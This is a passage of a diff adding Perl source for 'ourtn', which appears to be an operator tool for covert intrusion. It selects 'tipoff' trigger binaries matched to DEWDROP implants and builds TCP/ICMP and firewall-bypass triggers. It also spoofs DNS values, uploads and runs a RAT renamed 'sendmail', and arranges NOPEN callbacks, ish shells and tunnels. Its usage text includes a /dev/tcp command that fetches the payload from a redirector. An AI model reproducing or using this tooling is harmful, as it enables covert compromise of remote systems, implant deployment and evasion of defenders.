+  $tipoffprog = "tipoff-$opt_5.X" if (-x "$opbin/tipoff-$opt_5.X");
+  if ($opt_J) {
+    mymydie("-J requires -Y")
+      unless ($opt_Y);
+    $tipoffprog = $opt_J;
+    $tipoffprog =~ s,^$opbin/*,,g;
+    mymydie(	"Invalid tipoff binary -J $opt_J\n".
+		"Must be relative to /current/bin/".
+	"") unless (-f "$opbin/$tipoffprog");
+  }
+  chmod(0700,"$opbin/$tipoffprog")
+    unless (-x "$opbin/$tipoffprog");
+
+  unless ($tipoffprog) {
+    # If we find a match in $opbin/tipoffs, we have to prompt/confirm
+    my @possible = reverse sort split(/\n/,`cd $opbin/tipoffs ; ls -1t *v__${opt_5}* 2>/dev/null`);
+    my $listing = "";
+    my $choice = 1;
+    foreach (@possible) {
+      next unless (-x "$opbin/tipoffs/$_");
+      $listing .= sprintf("  [%d] ",$choice++).`cd $opbin/tipoffs ; ls -lL $_ | sed "s,.*root ,,g"`;
+    }
+    $choice--;
+    # IF CHANGE TO NO DEFAULT FOR UNIQUE MATCH: if (@possible > 1 and $listing) {
+    if ($listing) {
+      my $warning = "";
+      while (1) {
+	my $es = @possible > 1 ? "es" : "";
+	my ($ans,$longans) = mygetinput
+	   (
+	   $warning.
+	   # IF CHANGE: "Multiple matches to tipoff version $opt_5:\n\n".
+	   "Non-default match$es to tipoff version $opt_5 found in ../bin/tipoffs/:\n\n".
+	   "$listing\n\n".
+            $COLOR_FAILURE.
+            "Using the wrong version of tipoff is not a good idea.\n".
+            "The version used should match that of DEWDROP deployed most recently.\n".
+            "$COLOR_NORMAL\n".
+            $stoicmore.
+            "Which version of tipoff should we use (1-$choice)?",1
+	   );
+	mymydie("User aborted") if ($ans eq "a");
+	$ans = int($ans);
+	last if ($ans > 0 and $ans <= @possible);
+      }
+      $choice = $ans;
+    }
+    $tipoffprog = "tipoffs/". $possible[$choice-1]
+	if ($possible[$choice-1]);
+#offerabort("DBG: tipoffprog=$tipoffprog".
+#		`cd $opbin ; ls -dLal $tipoffprog*`.
+#		"DBG: tipoffprog=$tipoffprog=","A");
+  }
+
+  mymydie("Unable to find an executable tipoff binary with \"-5 $opt_5\"\n".
+	  "NOTE:  -5 Now requires a DEWDROP version (one to four dotted integers)")
+	unless ($tipoffprog and -x "$opbin/$tipoffprog");
+  
+
+  $tipoffusage = `$opbin/$tipoffprog -h 2>&1`;
+  mydie("Something is wrong, tipoff program \"$tipoffprog\" has no usage")
+    unless $tipoffusage =~ /usage/i;
+
+  ($tipoffexecuteoption) = $tipoffusage =~ /(--(upload-){0,1}execute)/;
+
+  # Move correct ish into place
+  if (!$binaryupload and $tipoffprog =~ /tipoff(__v__|-)([34])/) {
+    `rm -f $opbin/ish ; cp -p $opbin/ish.v$2 $opbin/ish`;
+  } elsif (! -f "$opbin/ish") {
+    `rm -f $opbin/ish ; cp -p $opbin/ish.v3 $opbin/ish`;
+  }
+  chmod 0700 , "$opbin/ish" ;
+
+
+  $tipoffargs = "" ;
+  $tipofftrigger = "" ;
+  mymydie("-y requires -Y") if ($opt_y and !($opt_Y));
+  if ($opt_Y) {
+    $tipofftrigger = "yes" ;
+    mymydie("-Y must not be used with -R|A|a") if ($opt_R or $opt_a or $opt_A);
+    mymydie("-Y requires $opbin/$tipoffprog") unless (-x ("$opbin/$tipoffprog")) ;
+    if ($opt_F) {
+      # Here, we change -U to its long version--the -U in there will
+      # confuse ftshell into seeing that as its -U argument when it isn't.
+      $opt_F =~ s/-U/--ur-compat/g;
+      my ($fw,$more) = $opt_F =~ /^([_\.0-9a-zA-Z]+)\s*(.*)/ ;
+      if ($fw)  {
+	$tipoffargs = " --bypass-firewall $opt_F" ;
+      } else {
+	$tipoffargs = " $opt_F" ;
+      }
+      $tipofftrigger = "icmp"
+	if ($tipoffargs =~ /icmp/ or
+	    $tipoffargs =~ /\-\S*I/ ) ;
+    }
+  } else {
+    mymydie("-F requires -Y or -y") if $opt_F ;
+  }
+
+  #winredir stuff
+  $winredir=0;
+  $windowsredir = $opt_W ;
+  if ($windowsredir) {
+    ($windowsip,$windowsport,$windowsraw) = split(/:/,$windowsredir) ;
+    mymydie("-W <Windows IP>:<Windows PORT> malformed ($windowsip:$windowsport)")
+      unless ($windowsip and $windowsport) ;
+    mymydie("Invalid Windows port $windowsport") unless portcheck($windowsport,1,65535); 
+    mymydie("Invalid Windows IP $windowsip") unless (ipcheck($windowsip)) ;
+    if (!$debug) {
+      progprint("pinging Windows redirector $windowsip to make sure it is up.",STDOUT);
+      mymydie("Windows IP $windowsip not responding to ping") unless (`ping -w1 -nc1 $windowsip | grep \" 0\\%.*loss\"`) ;
+    }
+    # rc not used via -irtun so no biggie
+    mymydie("$opbin/rc not found--required for -W")
+      unless (-x "$opbin/rc" or $calledbynopen or $tipofftrigger);
+    $winredir=1;
+  }
+
+  $sidetriggerport = int($opt_A);
+  mymydie("-A must be an integer between 1 and 65535") 
+    if (defined $opt_A and ($sidetriggerport < 1 or $sidetriggerport > 65535)) ;
+  if ($opt_a) {
+    if (!$sidetriggerport) {
+      $sidetriggerport = myrand() ;
+    }
+  }
+  if ($sidetriggerport) {
+    mymydie("Cannot use -a|A: $sttunmodule not found") unless
+      (-e $sttunmodule) ;
+    unless (-x "/usr/bin/python") {
+      if (open(OUT,"> $opdown/opnotes.txt.additional")) {
+	print OUT "\n\nSH: This opbox needs python.\n\n";
+	close(OUT);
+      }
+      mymydie("-A|a|K requires /usr/bin/python -- not found");
+    }
+
+  }
+  my $timetype = "";
+  ($retoffset) = $opt_Z =~ /^([-]{0,1}[\ddhms]+)$/ ;
+  $offsetmin = "" ;
+  $tipofftimeoffset = "";
+  if ($opt_Z) {
+    if ($tipofftrigger and ($opt_5 or $opt_J) and
+	$opt_Z =~ /^(K{0,1})([-]{0,1}[\ddhms]+)$/) {
+      my ($timek,$timestr) = ($1,$2);
+      # We default to minutes here but strtoseconds defaults to seconds.oops.
+      $timestr .= "m" unless $timestr =~ /[dhms]/;
+      my $timenow = time;
+      $tipofftimeoffset = $timenow + strtoseconds($timestr);
+      my $settime = "--set-time" if $tipoffusage =~ /--set-time/ ;
+      $settime = "--time" if $tipoffusage =~ /--time/ ;
+      mydie("tipoff program $tipoffprog does not have a --time or --set-time option")
+	unless $settime;
+      $tipofftimeoffset = " $settime $tipofftimeoffset";
+      $tipofftimeoffset = " $settime-skew ".strtoseconds($timestr) if $timek;
+dbg("Here Z=$opt_Z 1=$1 2=$2 timenow=$timenow too=$tipofftimeoffset");
+    } else {
+      if ($opt_5 or $opt_J) {
+	my $tipofftime = time + $retoffset;
+	$tipofftimeoffset = "--set-time $tipofftime";
+      }
+      mymydie("-Z argument ($opt_Z) must be of the form [-][#h]#[m][#s] (defaults to minutes)")
+	if (!$retoffset) ;
+      $retoffset = strtoseconds($retoffset);
+      mydie("Invalid -Z $opt_Z") if $retoffset < 0;
+      $retoffset *= 60 if ($timetype eq "h" or
+			   $timetype eq "m" or $timetype eq "") ;
+      $retoffset *= 60 if ($timetype eq "h") ;
+    }
+    $offsetmin = int($retoffset/60) ;
+  }
+  $retoffset = "0" unless $retoffset ;
+  $tryicmptime = (($opt_z or $rettrigger or $sidetriggerport) and ! defined $opt_Z) ;
+
+#  if ($rettrigger and !$calledbynopen) {
+#    # Not nopened but we are doing rettrigger so he calls us direct
+#    $ishcallbackip = $myip ;
+#  }
+  mymydie("Cannot use -R without $opbin/varkeys") unless (! $rettrigger or -d "$opbin/varkeys") ;
+  processargsonce() unless $hopping ;
+  mymydie("Cannot use -A|a via NOPEN redirectoin yet") if (($opt_A or $opt_a) and $calledbynopen) ;
+  # do rest every call to processargs
+  $upload   = ($opt_u or $opt_U or $opt_V or $binaryupload) ;
+  $uploadspecial = $opt_V ;
+#  if ($uploadspecial =~ /;/) {
+#    mymydie("Cannot use \";\" in -V argument. Try && instead. (or alternatively, point out why ; is failing to the author)") ;
+#    $uploadspecial =~ s/;/\\\\;/g ;
+#  }
+#  $uploadspecial =~ s/\&\&/\\\&\\\&/g ;
+#  $uploadspecial =~ s/\>/\\\>/g ;
+# $uploadspecial =~ s/\</\\\</g ;
+
+  # FTSHELL stuff (interactive)
+  $stayloggedin = $opt_L ;
+  $noftshell = ($opt_f or $binaryupload);
+  $usebash = $opt_B;
+  $ftshellauto = length $ENV{"TRYAUTOUPLOAD"}
+    unless $binaryupload;
+  if ($ftshellauto) {
+    preservefile("/usr/local/bin/whatrat.pl");
+    copy("$opbin/whatrat.pl","/usr/local/bin/whatrat.pl");
+    mydie("Cannot continue with TRYAUTOUPLOAD set--unable to copy whatrat.pl into /usr/local/bin. unset TRYAUTOUPLOAD or use -U and try again")
+      unless (-e "/usr/local/bin/whatrat.pl");
+    progprint("Using new auto-detect method \"-u viaftshellauto\", remote uname will tell ftshell what platform to upload");
+  }
+  $quietish = $opt_q ;
+  $ultraquietish = $opt_Q ;
+  undef $dotslash ;
+  $dotslash = $opt_P ;
+  undef $usesetenv;
+  $usesetenv = $opt_E ;
+#  $usewhich = $opt_m;
+  $dotslash = "./" if $dotslash ;
+
+  # RAT stuff (what/how to run)
+  $ratname = "sendmail" ;
+  $ratname = $opt_r if $opt_r ;
+  $executefile = ($opt_e or $binaryupload);
+  $platformtarget = $opt_T ;
+  $hardoverride = $opt_O ;
+  $overrideport = int($opt_o + $opt_O) ;
+  $gostraightthere = $opt_g ;
+  $skipspayed = $tipofftrigger;
+
+
+  # OURTN stuff (misc?)
+  $noiptables = $opt_I ;
+
+  if ($binaryupload) {
+    $opt_w = ""; # Might confuse things later?
+    $workingdir = "";
+    $cddir = "";
+    mymydie("-w BIN requires both -Y and -5 (-Y5)")
+      unless ($tipofftrigger and $opt_5) ;
+    # TODO: Change the tipoff binary here?
+    # TODO: Here add check that $tipoffprog has "--command 4" option available
+    mymydie("-w BIN (binary upload via DD) and -r cannot be used together\n".
+	    "(working directory is not up to you with -w BIN)")
+      if $opt_r;
+    mywarn("-w BIN implies -e (execute)") unless $opt_e;
+    $ratname = "";
+    mymydie("Cannot use -w BIN with -V") if $opt_V or $uploadspecial;
+    mymydie("-w BIN requires -U UPLOADFILE") unless $uploadspecific;
+    # TODO: Parse "noprep $uploadspecific" to alert/confirm with user
+    # the parameters it will run with.
+  } else {
+    $workingdir = $opt_w ;
+    if ($workingdir) {
+      $workingdir =~ s,/+,/,g;
+      mymydie("-w $workingdir must start with /") unless ($workingdir =~ /^\//) ;
+      $cddir = "cd $workingdir || cd /tmp";
+      $cddir = "cd /tmp" if ($workingdir eq "/tmp");
+    } else {
+      $workingdir = "" ;
+      $cddir = "";
+    }
+  }
+
+  if (!$usebash and !$binaryupload and !$nointeraction and
+      $executefile and $stayloggedin) {
+    my $ans = getinput("$COLOR_FAILURE\n\a".
+		       "Since you are keeping your IN window, do you want a bash shell if it\n".
+		       "is available (gives readline and prompt has date/time in it)? $COLOR_NORMAL",
+		       "Y") ;
+    $usebash = 1 unless ($ans =~ /^n/i) ;
+  }
+
+  mymydie("Cannot use -f and -u|U|V together")
+    if ($upload and $noftshell and !$binaryupload) ;
+#  now we want -u and U to both be ok. -U overrides
+#  mymydie("Cannot use -u and -U together") if ($opt_u and $opt_U) ;
+  undef $opt_u if $opt_U ;
+  mymydie("Cannot use -u|U with -V") if (($opt_u or $opt_U) and $opt_V) ;
+  mymydie("Cannot use -c and -C together") if ($opt_c and $opt_C);
+dbg("
+
+callbackip=$callbackip= 
+callbacktoip=$callbacktoip= 
+ishcallbackip=$ishcallbackip=
+
+callback=$callback=
+opt_c=$opt_c=
+opt_C=$opt_C=
+");
+  mymydie("Cannot use -a and -A together") if ($opt_a and $opt_A);
+  if ($stayloggedin) {
+    mymydie("-L requires -u, -U or -V") if (! $upload ) ;
+    mymydie("-L makes no sense with direct callback")
+      if ($callback and !$opt_C ) ;
+    mymydie("-L makes no sense with -w BIN binary upload")
+      if ($binaryupload);
+  }
+  mymydie("-N makes no sense with callback") if ($opt_N and $callback ) ;
+  mymydie("-c|C parameter requires -e") if (!$executefile and $callback ) ;
+  mymydie("-e requires -u|U|V parameter or -w BIN")
+    if ($executefile and ! $upload ) ;
+  mymydie("Cannot use -o and -O together") if ($opt_o and $opt_O) ;
+  mymydie("bad -o override port $overrideport (not $minport < p < $maxport)") if
+    (!$hardoverride and $overrideport and ! (portcheck($overrideport))) ;
+  mymydie("bad -O override port $hardoverride") if 
+    (!portcheck($overrideport,1,65535) and $opt_O) ;
+  # allow multiple -D arguments on line but only use last one
+  $opt_D =~ s/.*\s// ;
+  $spoofip = $opt_D ;
+  $noratconnect = $opt_N || $stayloggedin ;
+  $nopenport = myrand();
+  $nopenport = $overrideport if $overrideport ;
+  $noservercallbackdelaysecs = $opt_S if (defined $opt_S) ;
+  mymydie("invalid number of seconds -S $noservercallbackdelaysecs") if ($noservercallbackdelaysecs < 0) ;
+  undef $callbacktoip;
+  undef $callbackip;
+  if ($opt_C) {
+    $callbacktoip = $opt_C ;
+    $callbackip = $callbacktoip ;
+  } elsif ($opt_c) {
+    mymydie("Cannot determine my IP address for -c option") unless ($hopping or $myip) ;
+    $callbackip = $myip ;
+# not sure why this had been this way: Am I forgetting something?
+#    $callbackip = $myip unless ($calledbynopen) ;
+  }
+  undef $ishcallbackip ;
+  if ( defined $opt_i ) {
+    if (ipcheck($opt_i)) {
+      $ishcallbackip = $opt_i ;
+      $ipparm = "-i $opt_i";
+    } else {
+      mymydie( "Invalid -i IP $opt_i" );
+    }
+  }
+  $callbackip = $ishcallbackip if ($callback and $ishcallbackip and !$callbacktoip) ;
+  if ($callbackip) {
+    mymydie("Invalid IP $callbackip") unless (ipcheck($callbackip)) ;
+  }
+  if ($opt_K) {
+    if (!$sidetriggerport) {
+      mymydie("-K requires -a/A");
+    } else {
+      ($sideccip) = $opt_K =~ /([\d\.]*):/ ;
+      ($sideccport) = $opt_K =~ /:{0,1}(\d+)$/ ;
+      mymydie("Bad IP: $sideccip") if ($sideccip and !ipcheck($sideccip)) ;
+      mymydie("Must provide at least port to use -K[IP:]port") if ($sideccip and !$sideccport) ;
+      if (!$sideccip) { # find one
+	if (!$callbackip) {
+	  $sideccip = $myip if ($myip) ;
+	} else {
+	  $sideccip = $callbackip ;
+	}
+      }
+    }
+  }
+  undef $localparm ;
+  $localparm = "-l" if $opt_l ;
+  $debug = $opt_d;
+  undef $dnsipenv ;
+  if ( $spoofip ) {
+    # rootdns=echo looks funny, I know.
+    # it's supposed to be the function name for that dns entry, so it is
+    # executed in tn.spayed. We don't need it, here, since we're hard coding
+    # the environment variables. Executing "echo" is nicer than putting an
+    # error to the screen or defining a "null" subroutine.
+    $dnsipenv = "rootdns=echo DNS_NAME=ns2.ix.netcom.com DNS_IP=$spoofip DNS_SOA=hostmaster";
+  }
+  undef $triggerport ;
+  undef $tcptrigger ;
+  undef $ishcallbackport ;
+  undef $clearicmpdrop ;
+  undef $irtunishparm ;
+  undef $portparm ;
+  undef $sportparm ;
+  undef @ishcallbackports ;
+  undef $valtrigger;
+  $ishcallbackip = $myip unless $ishcallbackip;
+#  if ($spoofip) {
+#    $ishcallbackip = $spoofip ;
+#  }
+  if ( defined $opt_p ) {
+    mymydie("Malformed -p argument \"$opt_p\"") unless
+      $opt_p =~ /^(\d+|rhp)(,(rhp|\d+))*$/i ;
+    if ($opt_p =~ /,/) {
+      unless ($opt_7) {
+	mymydie("-p $opt_p: Must be a single port unless using -7");
+      }
+      my @tmpishcallbackports = split(/,/,$opt_p) ;
+      foreach my $myport ( @tmpishcallbackports ) {
+	  mymydie("Invalid -p port $_") unless portcheck($myport,1,65535) ;
+	  push(@ishcallbackports,portcheck($myport,1,65535));
+      }
+      $triggerport = shift(@ishcallbackports);
+      $portparm = "-p $triggerport";
+    } else {
+      mymydie("Invalid -p port $opt_p") unless portcheck($opt_p,1,65535) ;
+      $portparm = "-p $opt_p";
+      $ishcallbackport = portcheck($opt_p,1,65535);
+    }
+  }
+  if ( defined $opt_s ) {
+    if ($opt_s =~ /^(rhp|rand)/i) {
+      $opt_s = myrand();
+    }
+    if ($opt_s =~ /^\d+$/) { # first/old use of -s was with a port for tcp IN trigger
+      mymydie("Invalid -s port $opt_s") unless portcheck($opt_s,1,65535) ;
+      $sportparm = "-s $opt_s";
+      $triggerport = $opt_s ;
+      $tcptrigger = $opt_s ;
+    } elsif ($opt_s =~ /^(V{0,1})([yYJIpP]){0,1}(V{0,1})(\d+|rand\S*){0,1}(,(\d+)){0,1}$/) {
+      my ($valopt,$sarg,$valopt2,$sport,$icmpopts) = ($1,$2,$3,$4,$6) ;
+
+      mymydie("-s${valopt}$valopt2$sarg cannot be used with -5")
+	if ($sarg =~ /^[YyJ]/ and $opt_5);
+      # new polymorphic use of -s
+      if ($sport =~ /^rand/i) {
+	$sport = myrand();
+	mymydie("Cannot use \"rand\" with -s#,# option")
+	  if $icmpopts;
+      }
+      if (length $icmpopts) {
+	$tipofftrigger = "icmp";
+	$icmpopts = "$sport,$icmpopts";
+	$tipoffargs .= " --icmp-options $icmpopts";
+	$sport = "";
+      }
+      if ($sport > 0) {
+	$triggerport = $sport;
+	$tcptrigger = $sport;
+	$sportparm = "-s $sport";
+      }
+      $valopt = "V" if ($valopt or $valopt2);
+      $valtrigger = $valopt;
+      if ($valtrigger) {
+	mymydie("-sV* makes no sense with -w BIN binary upload")
+	  if $binaryupload;
+	$noratconnect=1;
+	mymydie("-sV$sarg$sport makes no sense--the \"$sarg\" means ICMP, which has no port")
+	  if $sport and $sarg;
+	mymydie("-s$opt_s makes no sense with -V since VA uploads very well as is")
+	  if $uploadspecial;
+	mymydie("$opbin/dragonbits must be executable to use -s$opt_s")
+	  unless (-x "$opbin/dragonbits");
+	mymydie("-s $opt_s (VA trigger) makes no sense without -e and either of -u or -U")
+	  unless $executefile;
+	mymydie("-s $opt_s (VA trigger) cannot be used with -V")
+	  if $uploadspecial;
+	mymydie("-s $opt_s (VA trigger) requires -Y (DD/tipoff trigger)")
+	  unless $tipofftrigger;
+      }
+      mymydie("-s${valopt}[yYJIpP] cannot be used with -7")
+	if $opt_7;
+      if ($sarg eq "I") {
+	mymydie("-s${valopt}I requires -Y or -6")
+	  unless ($tipofftrigger);
+	mymydie("-s${valopt}I may not be used with -yPORT (no ports with ICMP)")
+	  if $opt_y ;
+	$tipofftrigger = "icmp" ;
+      } elsif (lc $sarg eq "p") {
+	$tipofftrigger = "icmp" ;
+	mymydie("-s${valopt}[pP] requires -Y") unless ($tipofftrigger);
+	$tipoffargs .= " --icmp-options ";
+	if ($sarg eq 'p') {
+	  $tipoffargs .= "0,0";
+	} elsif ($sarg eq 'P') {
+	  $tipoffargs .= "3,3";
+	} else {
+	  mymydie("Invalid -s $opt_s argument");
+	}
+      } else {
+	$portparm = "$portparm -$sarg";
+	$clearicmpdrop++ unless $calledbynopen;
+      }
+      # the WIP:PORT part of -s is here but not in usage yet
+      # do we even need this since ourtn has its own -W?
+      my ($Wip,$Wport) = $opt_s =~ /W(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)/ ;
+      if ($Wip and $Wport) {
+        $opt_s =~ s/W$Wip:$Wport// ;
+        $portparm = "$portparm -W$Wip:$Wport" ;
+      }
+      mymydie("Triggers -s[JYypP] may not be used with -R trigger.")
+	if ($opt_R) ;
+    } else {
+      mymydie("($1,$2,$3)Invalid -s argument =$opt_s=");
+    }
+  }
+  $triggerport = myrand() unless $triggerport ;
+  $ishcallbackport = myrand() unless $ishcallbackport ;
+  undef $ishtunneltarget ;
+# TODO: later we parse opt_7 for multiple IP:ports--see $notyet.
+# undef $ishtunneltriggertype ;
+# undef $ishtunneltriggerport ;
+  $ishtunneltarget = $opt_7 ;
+  if ($ishtunneltarget) {
+    # any error checks?
+    if ($opt_W or $opt_b or $opt_Y or $opt_F or
+	$opt_R or $opt_A or $opt_a or $opt_K) {
+      mymydie("-7 ishtunnel not compatible with these options: -[Wb6FRAaK]");
+    }
+    chomp(my $ltuntest = `ps -wef | egrep "[ \/]ish |[ \/]ltun " | grep -v grep`) ;
+    mymydie("There appear to be \"ltun\" and/or \"ish\" processes running:\n\n$ltuntest\n\n".
+	  "Maybe from a failed use of ourtn -7? Clean up and try again.\n")
+      if $ltuntest;
+    if ($upload and $executefile and !$noratconnect) {
+      if (!$callbackip) {
+	mywarn("Using -7 ish tunnel makes almost NO sense with a call forward NOPEN.\n".
+	       "If we cannot trigger directly, can we call to a NOPEN server that way?\n".
+	       "Using callback (-c|C:IP) might make more sense instead.") ;
+	my $ans = getinput("Continue or Abort?","C","A") unless $nointeraction ;
+	mymydie("Aborting.") if ($ans =~ /^a/i);
+      } else {
+	mywarn("OK, trying to have NOPEN call back. But can it?\n".
+	       "If we had to redirect the INCISION trigger,\n".
+	       "will the callback to $callbackip work?\n\n");
+	my $ans = getinput("Continue or Abort?","C","A") unless $nointeraction;
+	mymydie("Aborting.") if ($ans =~ /^a/i);
+      }
+    }
+    @ishtunneltargets = split(/,/,$ishtunneltarget) ;
+  }
+  if ($gostraightthere and ! $debug) {
+    `touch $opetc/nocallbackprompt` ;
+  } else {
+    unlink("$opetc/nocallbackprompt");
+  }
+} # processargs
+
+sub processargsonce {
+  ($originaloptions) = "@originalparms" =~ /(.*)@ARGV/ ;
+  @originaloptions = split(/\s+/,"$originaloptions ") ;
+#mymydie("\$originaloptions=\"$originaloptions\"\n\@originaloptions=(@originaloptions)");
+  $nopen_mypid = $ENV{NOPEN_MYPID} ;
+  $nopen_mylog = $ENV{NOPEN_MYLOG} unless $nopen_mylog;
+  $nopen_rhostname = $ENV{NOPEN_RHOSTNAME} unless $nopen_rhostname;
+  ($nopen_version) = 
+    `grep "^RAT client" $opdown/hostinfo.$nopen_rhostname 2>/dev/null | tail -1`
+      =~ /([\d.]+)/ ;
+  $nohist = "-nohist " if ($nopen_version ge "3") ;
+  $travolta = $ENV{TRAVOLTA};
+  $ppid = getppid ;
+  chomp(my $parent = `ps -ef | egrep "^[^0-9]*$ppid" | grep -v grep`);
+  $calledbynopen = ($nopen_rhostname);
+  # Do not do this funky kludge connecting to localhost ports if doing
+  # $opt_T / $platformtarget (JL drops tcp and nc's never reset)
+  kludgeishport() unless ($opt_d or $opt_T);
+  if (!$calledbynopen
+      and ("$nopen_mypid$nopen_mylog$nopen_rhostname"
+	   or $parent =~ /noclient/ )) {
+    mywarn("Why are NOPEN_* env. vars set if NOPEN did not call $prog (i.e. if -n/-D not used)?\n\n".
+	   `env 2>&1 | egrep "NOPEN"`) ;
+    mymydie("As Switch would say, \"Not like this.\"") ;
+  }
+  if (!$calledbynopen) {
+    if ($burnthewitch) {
+      `touch $opetc/burnthewitch` ;
+    } else {
+      # This is first call and is at command line so is a clean start
+      unlink("$opetc/burnthewitch") ;
+    }
+    chomp(my $didcount = `ls -1 $opdown/didthis* | wc -l`);
+    if ( $didcount and !$burnthewitch) {
+      # Clean start means we prolly dont wanna do this whole thing again? That is
+      # Unless $burnthewitch is on, meaning it's probably unattended operation.
+      my @didthistest = ();
+      foreach my $ip (@ARGV) {
+	push(@didthistest,$ip) if  `grep " $ip " $opdown/didthis*`;
+      }
+      if (@didthistest) {
+	my $thisdude = "this dude";
+	$thisdude = "these dudes" if (@didthistest > 1);
+	print("$COLOR_FAILURE\n\a".
+	      "Hold on thar Tex!! Seems ta me we already got us a $opdown/didthis\n".
+	      "with $thisdude in it:\n\n   ".
+	      join("\n   ",@didthistest)."\n\n$COLOR_NOTE") ;
+	if ($nointeraction) {
+	  mywarn("NOINTERACTION mode, so proceeding.");
+	}	elsif ($inlab) {
+	  mywarn("Well, never mind. You seem to be in the lab.");
+	} else {
+	  sleep 1 ;  print("$COLOR_FAILURE\n\a".
+			   "I dunno....\n\n$COLOR_NOTE") ; sleep 1 ;
+	  my $ans = getinput("$COLOR_FAILURE\n\a".
+			     "Y'all sure you want to up-arrow and go pokin where ya already been?$COLOR_NORMAL",
+			     "N") ;
+	  if ($ans =~ /n/i) {
+	    mymydie("I Reckon! $COLOR_NOTE We'll just mosey on back to the command line here...\n");
+	  } else {
+	    mywarn("Alright, then. Guess ya means what ya says.\n"); sleep 1 ;
+	    mywarn("We'll jus save that thar old didthis file for ya, anyway.\n"); sleep 1 ;
+	  }
+	}
+      }
+    }
+    my $ext = "" ;
+    $ext++ while (-e "$opdown/didthis.old$ext") ;
+    rename("$opdown/didthis","$opdown/didthis.old$ext") if (-e "$opdown/didthis") ;
+  }
+  if ($opt_t) {
+    $hopsfile = $opt_t ;
+  } else {
+    @hopfiles = split(/\n/,`find $opetc 2>/dev/null | grep "\/hops.txt"`) ;
+    $hopsfile = $hopfiles[0] ;
+  }
+  if ($originaloptions and !@ARGV) {
+#    mymydie("All ourtn options must be in $hopsfile") ;
+  }
+  $pschain = scriptordie();
+} #processargsonce
+
+sub myinit {
+  my $gotutils = 0;
+    foreach ("../etc/autoutils",
+	   "/current/etc/autoutils",
+	   "autoutils") {
+    if (-r $_) {
+      require $_ or die "Could not require $_\n";
+      $gotutils++;
+      progprint("Sourcing $_",STDOUT)
+	if ($inlab and ! ("@ARGV" =~ /-\S*[hv]/i));
+      last;
+    }
+  }
+  unless ($gotutils) {
+    $COLOR_SUCCESS="\033[5;42m";
+    $COLOR_SUCCESS="\033[2;32m";
+    $COLOR_FAILURE="\033[2;31m";
+    $COLOR_WARNING="\033[1;33m";
+    $COLOR_NORMAL="\033[0;39m";
+    $COLOR_NOTE="\033[0;34m";
+    $prog = basename $0 ;
+    $opdir = "/current" ;
+    $opetc = "$opdir/etc" ;
+    $opbin = "$opdir/bin" ;
+    $opdown = "$opdir/down" ;
+    $| = 1;
+  }
+  %monstr = (0,Jan,1,Feb,2,Mar,3,Apr,4,May,5,Jun,6,
+	     Jul,7,Aug,8,Sep,9,Oct,10,Nov,11,Dec);
+  chomp($NOPENTN=$ENV{'NOPENTN'});
+  foreach (ppp0,eth0,eth1) {
+    chomp(my $tmpline = `ifconfig $_ 2>&1 | grep "inet addr"`) ;
+    ($myip) = ($tmpline =~ /inet addr:([0-9.]*) / ) ;
+    last if $myip ;
+  }
+  $sttunmodule = "";
+  chomp(my $tmpplatform = `uname -r`) ;
+  $sttunmodule = "$opbin/pyside/sttunmod-$tmpplatform.o";
+  $helpip = " ($myip)" if ($myip) ;
+  #default values
+  $noservercallbackdelaysecs = 30 ;
+  $noservercallbackdelaysecs = 14 if ($inlab) ;
+  $ishactivitywaitsecs = 8 ;
+  $ishactivitymaxwaitsecs = 600 ;
+  $minport = 10025 ;
+  $maxport = 65534 ;
+
+  $vertext = "$prog version $VER\n" ;
+  my $tipoff_fw_types = `tipoff --list-firewall-types 2>/dev/null` ;
+  if ($tipoff_fw_types) {
+    $tipoff_fw_types = " Possible\n           types: $tipoff_fw_types" ;
+    chomp($tipoff_fw_types);
+  }
+  $usagetextshort="$COLOR_NOTE
+Usage: $prog [-h|H]                     (prints short|long usage statement)
+       $prog [options]        (reads targets from $opetc/hops.txt)
+       $prog [options] target-IP-or-host [ anothertarget [another...]]
+$COLOR_NORMAL
+ourtn LOCAL options:
+-f         No ftshell wrapper will be used (not usable with -u|U|V without
+           VA trigger (-sV)).
+-k kfile   Use \"kfile\" instead of looking for a tn.spayed file. Use this if
+           your key is in tn.spayed.oldkey, for instance.
+-I         No iptables modifications. Otherwise, rules specific to targets
+           beyond the first are removed during -irtun command and then put
+           back in place, and all icmp deny rules are removed after
+           successful execution. $prog exits if first target is blocked.
+-d         Debug: only echos the trigger command for the chosen settings,
+           e.g. \"keys=blah ftshell tn.spayed [-p port] [-l] <ip-address>\".
+-t file    Use target hopsfile \"file\" instead of $opetc/hops.txt.
+-b         When using multiple hops, all but the final NOPEN servers are
+           burned automatically at end of op (after last NOPEN exits or
+           burns). This is most useful with an autoget.host.IP used on the
+           final hop, since autogets burn that host's server automatically.
+".
+#-0         (that's a zero) NONINTERACTION mode. Minimizes prompts to user,
+#           using what would have been defaults. Use with caution.
+"
+FTSHELL wrapper options:
+-q         Quiet mode--no ps or ls commands during ish (ignored if -f).
+-Q         Ultra-quiet mode--do unsets, cd /tmp and pwd commands, but not
+           date, w or uname (ignored if using -f).
+-L         ish shell remains active after upload/execute (forces -N).
+-B         ftshell will exec /bin/bash if available
+-9 list    Add the list of colon delimited paths to the remote PATH.
+
+RAT UPLOAD/EXECUTE options:
+-u         Upload rat (exact file is determined from platform in tn.spayed
+           \"OS:\" line (with INCISION) or by prompting user.
+-U file    Upload this local file instead (execute if -e also there).
+-V \"str\"   (instead of -u|U) Use the commands in \"str\" on target to
+           somehow get the file there as the right filename. This is
+           usually some sort of ftp or wget, or this ksh trick (combined
+           with somehow serving up the right RAT via REDIR:NETCATPORT, say
+           with packrat combined with a NOPEN tunnel):
+
+            -V \"ksh -c 'cat < /dev/tcp/REDIRIP/NETCATPORT > sendmail'\"
+
+-w BIN     Use the tipoff \"--execute RATFILE\" binary upload (no ftshell,
+           no interactivity, no choice in remote ratname). Requires
+           DEWDROP 3.1.*.* or better. (\"--upload-execute\" for DEWDROP v4)
+-w wdir    Upload rat to directory wdir (default=/tmp).
+-r rname   Run rat as rname at remote side (default=sendmail).
+-c         nopen callback to this IP$helpip (or -irtun source IP).
+-C ipadr   nopen callback ipadr--separate listener window required.
+-e         Execute file just uploaded using random listen/callback port.
+-X         With -e, use \"exec\" to run it. Be sure it removes itself.
+-P         Assume PATH=. will fail so use ./rname".
+#-m         Use which, not type, to find target commands (uudecode, etc.).
+#           (FreeBSD targets default to which. -m will use type instead in
+#           that case.)
+"
+-E         Use setenv/tcsh syntax (i.e. \"setenv S 30\") on target. (Use
+           this if you the error \"PATH=.: Command not found.\" 
+           (FreeBSD targets default to using setenv. -E on FreeBSD will
+           undo that and use bourne shell syntax.)
+-o port    Override random port with this one (callback or listen port).
